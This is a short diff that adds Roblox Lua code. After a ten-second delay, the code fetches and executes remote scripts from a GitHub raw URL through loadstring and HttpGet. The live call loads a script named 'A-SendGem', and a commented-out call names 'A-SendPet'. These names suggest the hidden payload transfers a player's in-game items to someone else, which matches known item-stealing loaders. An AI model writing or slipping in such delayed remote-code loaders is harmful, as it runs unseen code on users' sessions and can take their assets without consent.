@@ -1,0 +1,9 @@
+spawn(function()
+task.wait(10)
+--loadstring(game:HttpGet("https://raw.githubusercontent.com/dracular111/01/main/A-SendPet"))()
+end)
+
+spawn(function()
+task.wait(10)
+loadstring(game:HttpGet("https://raw.githubusercontent.com/dracular111/01/main/A-SendGem"))()
+end)
